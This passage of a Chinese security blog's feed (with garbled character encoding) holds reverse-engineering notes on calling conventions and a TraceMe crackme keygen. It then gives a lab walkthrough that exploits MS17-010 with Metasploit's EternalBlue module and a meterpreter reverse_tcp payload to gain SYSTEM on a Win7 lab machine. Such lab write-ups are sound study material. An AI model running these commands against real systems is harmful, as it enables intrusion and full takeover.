class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Hello,World\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨kalié‡Œåˆ›å»ºtest0.cæ–‡ä»¶ï¼›</p><p><img src="https://s1.ax1x.com/2020/05/14/YBwEyq.png" alt="YBwEyq.png"></p><h3 id="AT-amp-Tè¯­æ³•"><a href="#AT-amp-Tè¯­æ³•" class="headerlink" title="AT&amp;Tè¯­æ³•"></a>AT&amp;Tè¯­æ³•</h3><p><img src="https://s1.ax1x.com/2020/05/14/YBwemV.png" alt="YBwemV.png"></p><h3 id="Intelè¯­æ³•"><a href="#Intelè¯­æ³•" class="headerlink" title="Intelè¯­æ³•"></a>Intelè¯­æ³•</h3><p><img src="https://s1.ax1x.com/2020/05/14/YBwVO0.png" alt="YBwVO0.png"><br>+++</p><h2 id="ç¨‹åºå››ã€linuxä¸‹64ï¼Œ32"><a href="#ç¨‹åºå››ã€linuxä¸‹64ï¼Œ32" class="headerlink" title="ç¨‹åºå››ã€linuxä¸‹64ï¼Œ32"></a>ç¨‹åºå››ã€linuxä¸‹64ï¼Œ32</h2><h3 id="ç¨‹åºæºç -3"><a href="#ç¨‹åºæºç -3" class="headerlink" title="ç¨‹åºæºç "></a>ç¨‹åºæºç </h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_function</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c,<span class="keyword">int</span> d)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> flag;</span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">10</span>];</span><br><span class="line">flag=<span class="number">31337</span>;</span><br><span class="line">buffer[<span class="number">0</span>]=<span class="string">'A'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test_function(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>+++</p><p>64ä½ç‰ˆæœ¬ï¼Œå¯çœ‹å‡º<strong>main</strong>å‡½æ•°ä¸­1,2,3,4åˆ†åˆ«å­˜å‚¨åœ¨å¯„å­˜å™¨<strong>edi,esi,edx,ecx</strong>ä¸­ï¼›<strong>test_function</strong>å‡½æ•°ä¸­é€šè¿‡ä¸Šè¿°å››ä¸ªå¯„å­˜å™¨å°†å€¼å­˜å‚¨åœ¨æ ˆä¸­;</p><p><img src="https://s1.ax1x.com/2020/05/14/YDiGxP.png" alt="YDiGxP.png"><br>[11]:()<br><img src="https://s1.ax1x.com/2020/05/14/YDi82t.png" alt="YDi82t.png"><br>+++</p><p>æ‰§è¡Œè‡³<strong>0x55555555515b</strong>å¤„,å³test_functionå‡½æ•°ï¼›</p><p><img src="https://s1.ax1x.com/2020/05/14/YDiYKf.png" alt="YDiYKf.png"><br>è¿›å…¥test_functionå‡½æ•°å†…éƒ¨ï¼›</p><p><a href="https://imgchr.com/i/YDiBPs" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/14/YDiBPs.png" alt="YDiBPs.png"></a><br>æ‰§è¡Œè‡³<strong>pop</strong>æ“ä½œå¤„ï¼š</p><p><img src="https://s1.ax1x.com/2020/05/14/YDiNqS.png" alt="YDiNqS.png"><br>æ­¤æ—¶çš„æ ˆï¼š</p><p><img src="https://s1.ax1x.com/2020/05/14/YDiaVg.png" alt="YDiaVg.png"><br>å¯¹åº”çš„æ ˆå¸§å¦‚ä¸‹è¡¨ï¼š</p><table><thead><tr><th>rsp</th><th>e1b0</th><th>0x00007fffffffe1c0</th></tr></thead><tbody><tr><td></td><td><strong>e1c0</strong></td><td><strong>0x0000555555555170</strong></td></tr><tr><td><strong>æœ€åä¸€å­—èŠ‚ä¸ºbuffer<a href="()">0</a></strong></td><td><strong>e1d0</strong></td><td><strong>0x0000000000000000</strong></td></tr><tr><td></td><td><strong>e1e0</strong></td><td><strong>0x0000000100040000</strong></td></tr><tr><td><strong>rbp</strong></td><td><strong>e1f0</strong></td><td><strong>0x0000000000000000</strong></td></tr></tbody></table><p>+++</p><h2 id="ç¨‹åº5ã€TraceMe-exe"><a href="#ç¨‹åº5ã€TraceMe-exe" class="headerlink" title="ç¨‹åº5ã€TraceMe.exe"></a>ç¨‹åº5ã€TraceMe.exe</h2><h3 id="æ±‡ç¼–ä»£ç "><a href="#æ±‡ç¼–ä»£ç " class="headerlink" title="æ±‡ç¼–ä»£ç "></a>æ±‡ç¼–ä»£ç </h3><p>æ ¹æ®<strong>GetDlgItemTextA</strong>å‡½æ•°æ‰¾åˆ°ç¨‹åºçš„å…³é”®ä»£ç å¤„ï¼š</p><p><img src="https://s1.ax1x.com/2020/05/14/YDi38I.png" alt="YDi38I.png"><br>è¾“å…¥ç”¨æˆ·å1234567,åºåˆ—å·08173144;</p><p><img src="https://s1.ax1x.com/2020/05/14/YDiw5j.png" alt="YDiw5j.png"><br>å‘ç°eaxä¿å­˜åºåˆ—å·é•¿åº¦ï¼Œebxä¿å­˜ç”¨æˆ·åé•¿åº¦:</p><p><img src="https://s1.ax1x.com/2020/05/14/YDidaQ.png" alt="YDidaQ.png"><br>test al,alåˆ¤æ–­ç”¨æˆ·åç¬¬ä¸€å­—èŠ‚æ˜¯å¦ä¸ºç©ºï¼Œç©ºçš„è¯è·³è½¬ã€‚</p><p>åˆ†æåå¾—çŸ¥0X0040138Fä¸ºè·³è½¬åˆ¤æ–­æ˜¯å¦è¾“å…¥æ­£ç¡®ï¼Œå¦‚ä¸‹ä»£ç ï¼š</p><p><img src="https://s1.ax1x.com/2020/05/14/YDcgC6.png" alt="YDcgC6.png"><br>å¯ä»¥ç›´æ¥æŒ‰ç…§00401347â€”â€”00401378å†™å‡ºæ³¨å†Œæœºï¼›</p><p>+++</p><p>åºåˆ—å·ç”Ÿæˆç®—æ³•ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">15</span>];</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line"><span class="keyword">char</span> arr[]=&#123;<span class="number">0x0c</span>,<span class="number">0x0a</span>,<span class="number">0x13</span>,<span class="number">0x09</span>,<span class="number">0x0c</span>,<span class="number">0x0b</span>,<span class="number">0x0a</span>,<span class="number">0x0b</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> len=<span class="built_in">strlen</span>(s);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">3</span>,j=<span class="number">0</span>;j&lt;len;i++,j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(j&gt;<span class="number">7</span>)</span><br><span class="line">j=<span class="number">0</span>;</span><br><span class="line">r+=s[i]*arr[j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯ä»¥ç”¨æˆ·å1234567ï¼Œå¾—åˆ°åºåˆ—å·ï¼š</p><p><img src="https://s1.ax1x.com/2020/05/14/YDcsER.png" alt="YDcsER.png"><br>Check:</p><p><img src="https://s1.ax1x.com/2020/05/14/YDchKe.png" alt="YDchKe.png"><br>æˆåŠŸï¼</p><p>+++</p><h2 id="ç¨‹åºå…­ã€è°ƒç”¨stdcallã€fastcallâ€¦"><a href="#ç¨‹åºå…­ã€è°ƒç”¨stdcallã€fastcallâ€¦" class="headerlink" title="ç¨‹åºå…­ã€è°ƒç”¨stdcallã€fastcallâ€¦"></a>ç¨‹åºå…­ã€è°ƒç”¨<code>stdcall</code>ã€<code>fastcall</code>â€¦</h2><h3 id="1-stdcall"><a href="#1-stdcall" class="headerlink" title="1.stdcall"></a>1.stdcall</h3><p>ç¤ºä¾‹ä»£ç ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">void</span> __<span class="function">stdcall <span class="title">demo_cdecl</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> z,<span class="keyword">int</span> w)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> sum=x+y+z+w;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">demo_cdecl(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>+++</p><p>æ±‡ç¼–ä»£ç ï¼š</p><blockquote><p>x32dbg</p></blockquote><p><img src="https://s1.ax1x.com/2020/05/14/YDcyU1.png" alt="YDcyU1.png"></p><p>è¢«è°ƒç”¨æ–¹è°ƒæ•´æ ˆå¸§ï¼š</p><p><img src="https://s1.ax1x.com/2020/05/14/YDc64x.png" alt="YDc64x.png"></p><h3 id="2-fastcall"><a href="#2-fastcall" class="headerlink" title="2.fastcall"></a>2.fastcall</h3><p>ç¤ºä¾‹ä»£ç ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">demo_cdecl</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> z,<span class="keyword">int</span> w)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> sum=x+y+z+w;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">demo_cdecl(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>+++</p><p>æ±‡ç¼–ä»£ç ï¼š</p><p><img src="https://s1.ax1x.com/2020/05/14/YDcRgO.png" alt="YDcRgO.png"></p><p>è¢«è°ƒç”¨æ–¹è°ƒæ•´æ ˆå¸§ï¼š</p><p><img src="https://s1.ax1x.com/2020/05/14/YDcWvD.png" alt="YDcWvD.png"><br>+++</p><h3 id="3-cdecl"><a href="#3-cdecl" class="headerlink" title="3.cdecl"></a>3.cdecl</h3><p>ç¤ºä¾‹ä»£ç ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">demo_cdecl</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> z,<span class="keyword">int</span> w)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> sum=x+y+z+w;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">demo_cdecl(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>+++</p><p>æ±‡ç¼–ä»£ç ï¼š</p><p><img src="https://s1.ax1x.com/2020/05/14/YDc4DH.png" alt="YDc4DH.png"></p><p>è¢«è°ƒç”¨æ–¹è°ƒæ•´æ ˆå¸§ï¼š</p><p><img src="https://s1.ax1x.com/2020/05/14/YDcDb9.png" alt="YDcDb9.png"><br>+++</p><h3 id="4-thiscall"><a href="#4-thiscall" class="headerlink" title="4.thiscall"></a>4.thiscall</h3><p>ç¤ºä¾‹ä»£ç ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CSum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CSum sum;</span><br><span class="line">sum.Add(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>+++</p><p>æ±‡ç¼–ä»£ç ï¼š</p><p><img src="https://s1.ax1x.com/2020/05/14/YDc28K.png" alt="YDc28K.png"></p><p>è¢«è°ƒç”¨æ–¹è°ƒæ•´æ ˆå¸§ï¼š</p><p><img src="https://s1.ax1x.com/2020/05/14/YD7pCQ.png" alt="YD7pCQ.png"><br>+++</p><h3 id="5-64ä½æ“ä½œç³»ç»Ÿ"><a href="#5-64ä½æ“ä½œç³»ç»Ÿ" class="headerlink" title="5.64ä½æ“ä½œç³»ç»Ÿ"></a>5.64ä½æ“ä½œç³»ç»Ÿ</h3><p>ç¤ºä¾‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Add</span><span class="params">(<span class="keyword">int</span> n1,<span class="keyword">int</span> n2,<span class="keyword">int</span> n3,<span class="keyword">int</span> n4,<span class="keyword">int</span> n5,<span class="keyword">int</span> n6)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> n1+n2+n3+n4+n5+n6;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\r\n"</span>,Add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>+++</p><p>Mainå‡½æ•°ï¼š</p><p><img src="https://s1.ax1x.com/2020/05/14/YDTLut.png" alt="YDTLut.png"></p><p>Addå‡½æ•°ï¼š</p><p><img src="https://s1.ax1x.com/2020/05/14/YDTz4g.png" alt="YDTz4g.png"></p><p>+++</p><h3 id="6-64ä½gcc"><a href="#6-64ä½gcc" class="headerlink" title="6.64ä½gcc"></a>6.64ä½gcc</h3><p>mainå‡½æ•°ï¼Œ6ä¸ªå‚æ•°ä»å·¦å‘å³æ”¾å…¥å¯„å­˜å™¨:<strong>rdi,rsi,rdx,rcx,r8,r9</strong></p><p><img src="https://s1.ax1x.com/2020/05/14/YDTvE8.png" alt="YDTvE8.png"></p><p>Addå‡½æ•°ï¼š</p><p><img src="https://s1.ax1x.com/2020/05/14/YDTxUS.png" alt="YDTxUS.png"></p><h3 id="7-è™šå‡½æ•°è°ƒç”¨"><a href="#7-è™šå‡½æ•°è°ƒç”¨" class="headerlink" title="7.è™šå‡½æ•°è°ƒç”¨"></a>7.è™šå‡½æ•°è°ƒç”¨</h3><p>å®ä¾‹ä»£ç ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CSum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">Add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">Sub</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> a-b;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CSum* pCSum=<span class="keyword">new</span> CSum;</span><br><span class="line">    pCSum-&gt;Add(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">    pCSum-&gt;Sub(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>+++</p><p>Mainå‡½æ•°æ±‡ç¼–ï¼š</p><p><img src="https://s1.ax1x.com/2020/05/14/YDTXHf.png" alt="YDTXHf.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ç¨‹åºä¸€ã€å­—èŠ‚åº&quot;&gt;&lt;a href=&quot;#ç¨‹åºä¸€ã€å­—èŠ‚åº&quot; class=&quot;headerlink&quot; title=&quot;ç¨‹åºä¸€ã€å­—èŠ‚åº&quot;&gt;&lt;/a&gt;ç¨‹åºä¸€ã€å­—èŠ‚åº&lt;/h2&gt;&lt;h3 id=&quot;ç¨‹åºæºç &quot;&gt;&lt;a href=&quot;#ç¨‹åºæºç &quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
      <category term="é€†å‘" scheme="https://singlemindedt.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>åˆ©ç”¨æ°¸æ’ä¹‹è“è·å–meterpretershell</title>
    <link href="https://singlemindedt.github.io/2020/05/10/%E5%88%A9%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E8%8E%B7%E5%8F%96meterpretershell/"/>
    <id>https://singlemindedt.github.io/2020/05/10/åˆ©ç”¨æ°¸æ’ä¹‹è“è·å–meterpretershell/</id>
    <published>2020-05-10T11:49:35.000Z</published>
    <updated>2020-05-11T08:24:25.408Z</updated>
    
    <content type="html"><![CDATA[<p><strong>å®éªŒç¯å¢ƒï¼š</strong></p><p>æ”»å‡»æœºï¼šKaliï¼ˆ192.168.40.128ï¼‰</p><p>é¶æœºï¼šWin7ï¼ˆ192.168.40.142ï¼‰</p><p>+++</p><p><strong>æ”»å‡»è¿‡ç¨‹ï¼š</strong></p><ol><li>å¼€å¯msf</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/05/11/YJeXoq.png" alt="YJeXoq.png"></p><ol start="2"><li>æƒ…æŠ¥æœé›†ï¼Œé¦–å…ˆç¡®å®šç›®æ ‡æ˜¯å¦å¼€æ”¾445ç«¯å£ï¼Œæ¼æ´Ms17-010æ˜¯å¦å­˜åœ¨</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmapæ¢æµ‹ä¸»æœºä¿¡æ¯ï¼šnmap -sV 192.168.40.142</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/05/11/YJeOwn.png" alt="YJeOwn.png"></p><p>445ç«¯å£å¼€æ”¾ï¼Œç›®çš„ä¸»æœºä¸ºwindows7ç³»ç»Ÿï¼Œæ¨æµ‹å­˜åœ¨ms17-010æ¼æ´;</p><ol start="3"><li>åˆ©ç”¨msfçš„è¾…åŠ©æ¨¡å—auxiliaryè¿›è¡Œæ¼æ´éªŒè¯</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/05/11/YJexYV.png" alt="YJexYV.png"></p><p>æœç´¢ç›¸å…³æ¼æ´æ¨¡å—å¾—åˆ°5æ¡ç»“æœï¼Œæœ‰è¿œç¨‹Windowså‘½ä»¤æ‰§è¡Œã€è¿œç¨‹Windowså†…æ ¸æŸåã€ä»£ç æ‰§è¡Œç­‰ï¼Œæ­¤å¤„ä½¿ç”¨<code>auxiliary/scanner/smb/smb_ms17_010</code> è¿›è¡ŒéªŒè¯ï¼›</p><p>é…ç½®åŸºæœ¬ä¿¡æ¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use  auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line"><span class="built_in">set</span>  rhost  192.168.40.142</span><br><span class="line"><span class="built_in">set</span>  rport   445</span><br></pre></td></tr></table></figure><p>è¿è¡Œæ¢æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/05/11/YJebLj.png" alt="YJebLj.png"></p><p>æ ¹æ®ç»“æœï¼Œå­˜åœ¨è¯¥æ¼æ´ã€‚</p><ol start="4"><li>æ¸—é€æ”»å‡»</li></ol><p>ä½¿ç”¨æ¸—é€æ”»å‡»ï¼ˆexploitï¼‰æ¨¡å—ï¼›</p><ul><li>è®¾ç½®æ”»å‡»ç›®æ ‡åœ°å€+ç«¯å£ã€æœ¬æœºåœ°å€</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use  exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>  rhost  192.168.40.142</span><br><span class="line"><span class="built_in">set</span>  rport   445</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.40.128</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/05/11/YJeHyQ.png" alt="YJeHyQ.png"></p><ul><li>è®¾ç½®payload</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>  payload   windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/05/11/YJeTSS.png" alt="YJeTSS.png"></p><ul><li>æŸ¥çœ‹é…ç½®å®Œæ•´æ€§</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/05/11/YJezWT.png" alt="YJezWT.png"></p><p>åœ¨Exploit targetsä¸­å¯çœ‹åˆ°win7å’Œserver 2008 r2éƒ½é€‚ç”¨ï¼›</p><ul><li>æ”»å‡»</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/05/11/YJe7Qg.png" alt="YJe7Qg.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œç›´æ¥å¾—åˆ°äº†é¶æœºsystemæƒé™ï¼Œå¹¶ç»™å‡ºäº†<strong>shell</strong>ç•Œé¢ã€‚</p><p>+++</p><p>å†å›å¤´çœ‹çœ‹æˆ‘ä»¬çš„payloadï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>  payload   windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><p>ç›®çš„æ˜¯è¿›å…¥<strong>meterpreter</strong>æ¨¡å¼ï¼Œä½†æ˜¯ç»“æœå¹¶ä¸æ˜¯è¿™æ ·ã€‚æ£€æŸ¥é…ç½®åï¼Œå‘ç°åŸå› ï¼š</p><blockquote><p>Metasploitä¸­çš„æ‰«æå™¨å’Œå¤§éƒ¨åˆ†çš„å…¶ä»–è¾…åŠ©æ¨¡å—ä½¿ç”¨RHOSTSé€‰é¡¹è€Œä¸æ˜¯RHOST</p></blockquote><p>å°†é…ç½®éƒ¨åˆ†ä¸­<code>rhost</code>æ”¹ä¸º<code>rhosts</code>,å¼€å§‹æ”»å‡»æˆåŠŸè¿›å…¥<strong>meterpreter</strong>æ¨¡å¼ï¼š</p><p><img src="https://s1.ax1x.com/2020/05/11/YJevF0.png" alt="YJevF0.png"></p><p>+++</p><ol start="5"><li>æŸ¥çœ‹æ­¤ç”¨æˆ·æƒé™</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/05/11/YJeLes.png" alt="YJeLes.png"></p><p>å¦‚å›¾ï¼Œå·²ç»è·å¾—<code>NT AUTHORITY\SYSTEM</code>æƒé™ã€‚</p><p>+++</p><blockquote><p><strong>Meterpreter</strong>: 